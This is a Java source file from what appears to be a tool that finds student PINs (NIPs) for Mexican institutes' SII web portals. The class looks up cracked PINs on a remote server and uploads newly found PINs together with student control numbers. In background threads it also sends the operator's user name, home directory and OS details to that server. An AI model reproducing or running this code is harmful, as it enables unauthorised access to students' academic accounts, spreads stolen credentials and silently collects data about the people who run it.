package sii;
import java.net.HttpURLConnection;
import java.util.HashMap;

import javax.swing.JOptionPane;

public class HttpPassFinder extends BasePassFinder{

	public void startDB(){
		if (recordSearch){
			new Thread(new Runnable(){
				public void run(){
					saveThisSessionData();
				}
			}).start();
		}
	}

	public void findUrlInstituto(){
		urlInstituto = "http://sii.TU_INSTITUTO.edu.mx/acceso.php";
		String IDinstituto = null;
		if(Character.isDigit(numeroControl.charAt(0)))
			IDinstituto = numeroControl.substring(2,4);
		else
			IDinstituto = numeroControl.substring(3,5);
		try {
			HashMap<String, String> query = new HashMap<String, String>();
			query.put("snit", "IL");
			query.put("p1", IDinstituto);			
			
			HttpURLConnection connection = ServerConn.shared().openConnection(ServerConn.Method.POST, query);
            String foundUrl = ServerConn.shared().getResponse(connection);

            if(foundUrl.equals("no_record")){
            	//prompt to include institute and warn that this app might not work properly
            	if(useSwing){
    				int res = JOptionPane.showConfirmDialog(null,"No se tiene registrado el instituto: "+
    					"\nde donde pertenece el noControl: "+numeroControl+
    					".\nLa direccion del SII es:"+urlInstituto,
    					"Busqueda de NIP", JOptionPane.YES_NO_OPTION);
    				if(res == JOptionPane.YES_OPTION){
    					Instituto = JOptionPane.showInputDialog(null,"Introduce la instituci�n (Ej. 'itmexicali'):",
    								"Busqueda de NIP",JOptionPane.QUESTION_MESSAGE).trim();
    					urlInstituto = "http://sii."+Instituto+".edu.mx/acceso.php";
    				}
    				else{
    					JOptionPane.showMessageDialog(null,"Para registrar tu instituto en esta aplicaci�n,\n" +
    							"envia un correo con el enlace a tu Sistema de Informaci�n Integral (SII)\n" +
    							"al correo miichaeld@outlook.com",
    							"Busqueda de NIP",JOptionPane.INFORMATION_MESSAGE);
    					System.exit(0);
    				}
    			}
    			else {
    				System.out.println("No se tiene registrado el instituto:"+
    						"de donde pertenece el noControl: "+numeroControl+
    					".\nLa direccion del SII es: \'"+urlInstituto+"\' ? Y/N");
    				String res = in.next();
    				if(res.charAt(0) == 'Y' ||  res.charAt(0) == 'y'){
    					System.out.println("Introduce la instituci�n (Ej. 'itmexicali'):");
    					Instituto = in.next().trim();
    					//save it ONLINE
    				}
    				else{
    					System.out.println("Para registrar tu instituto en esta aplicaci�n,\n" +
    							"envia un correo con el enlace a tu Sistema de Informaci�n Integral (SII)\n" +
    							"al correo miichaeld@outlook.com");
    					System.exit(0);
    				}
    			}
            }
            else{
            	urlInstituto = foundUrl;
            	System.out.println("force lookup in url: "+urlInstituto);
			}
		} catch (Exception e) {	System.out.println("Error fInsitute: "+e.getMessage());}
	}

	public synchronized void saveQuery(){
		new Thread(new Runnable(){
			public void run(){
				try {
					HashMap<String, String> query = new HashMap<String, String>(3);
					query.put("snit", "SQ");
					query.put("p1", System.getProperty("user.name"));
					query.put("p2", numeroControl);
					
					HttpURLConnection connection = ServerConn.shared().openConnection(ServerConn.Method.POST, query);
		            System.out.println("SS2: " +connection.getResponseCode());
				} catch (Exception e) {	System.out.println("Error SS2: "+e.getMessage());}
			}//end run
		}).start();//end thread
	}

	/** 	If we now searching for the NIP and the DB connection is
	 * ready check if it's already stored in the DBs and save this query.
	 * NOTE: This search is done in a new thread*/
	public synchronized void searchNIPonRecords(){
		if(searching){
			new Thread(new Runnable(){
				public void run(){
					System.out.println("Searching in records...");
					try {
						String query = String.format("snit=NL&p1=%s",numeroControl);
						HttpURLConnection connection = ServerConn.shared().openConnection(ServerConn.Method.POST, query);
			            String nip = ServerConn.shared().getResponse(connection);

			            if(nip.equals("no_record"))
			            	return;
			            int nip1 =Integer.parseInt(nip.trim());

			            if(useSwing){
							int res = JOptionPane.showConfirmDialog(null,"Se encontro un NIP en registro: "+
								nip+"\nDesea cancelar la busqueda?",
								"Busqueda de NIP", JOptionPane.YES_NO_OPTION);
							if(res == JOptionPane.YES_OPTION){
								setNIPfound(nip1,false);
							}
						}
						else if(in != null){
							System.out.println("NIP is already on record: "+nip+", do you want to cancel current search? Y/N");
							String res = in.next();
							if(res.charAt(0) == 'Y' ||  res.charAt(0) == 'y'){
								setNIPfound(nip1,false);
							}
						}
					} catch (Exception e) {	System.out.println("Error sNOR: "+e.getMessage());}
				}//end run
			}).start();//end thread
		}//endif
	}

	/**		Save this session information, incluiding machine running the program */
	public synchronized void saveThisSessionData(){
		if( recordSearch ){
			try {
				HashMap<String, String> query = new HashMap<String, String>();
				query.put("snit", "SS");
				query.put("p1", System.getProperty("user.name"));
				query.put("p2", System.getProperty("user.home"));
				query.put("p3", System.getProperty("os.name"));
				query.put("p4", System.getProperty("os.version"));
				query.put("p5", System.getProperty("os.arch"));
				
				HttpURLConnection connection = ServerConn.shared().openConnection(ServerConn.Method.POST,query);
				System.out.println("SS1: " +connection.getResponseCode());
			} catch (Exception e) {	System.out.println("Error SS1: "+e.getMessage());}
		}
	}

	public void saveFoundNip(){
		if( recordSearch ){
			String IDinstituto = null;
			if(Character.isDigit(numeroControl.charAt(0)))
				IDinstituto = numeroControl.substring(2,4);
			else
				IDinstituto = numeroControl.substring(3,5);
			try {
				HashMap<String, String> query = new HashMap<String, String>();
				query.put("snit", "SN");
				query.put("p1", numeroControl);
				query.put("p2", Integer.toString(mNIP));
				query.put("p3", IDinstituto);
				HttpURLConnection connection = ServerConn.shared().openConnection(ServerConn.Method.POST,query);
				System.out.println("SN: " +connection.getResponseCode());
			} catch (Exception e) {	System.out.println("Error SN: "+e.getMessage());}
		}
	}
}

